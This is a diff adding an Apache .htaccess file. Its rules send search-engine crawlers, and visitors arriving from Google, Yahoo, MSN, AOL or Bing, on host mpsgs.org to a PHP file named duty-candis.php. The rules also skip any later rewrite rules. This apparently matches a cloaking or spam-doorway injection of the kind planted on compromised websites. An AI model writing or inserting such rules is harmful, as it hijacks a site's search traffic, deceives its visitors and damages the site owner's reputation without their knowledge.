@@ -1,0 +1,8 @@
+RewriteEngine On
+
+RewriteBase /
+RewriteCond %{HTTP_USER_AGENT} (google|yahoo|msn|aol|bing) [OR]
+RewriteCond %{HTTP_REFERER} (google|yahoo|msn|aol|bing)
+RewriteCond %{HTTP_HOST} mpsgs\.org$
+RewriteRule . duty-candis.php [L,S=10000]
+
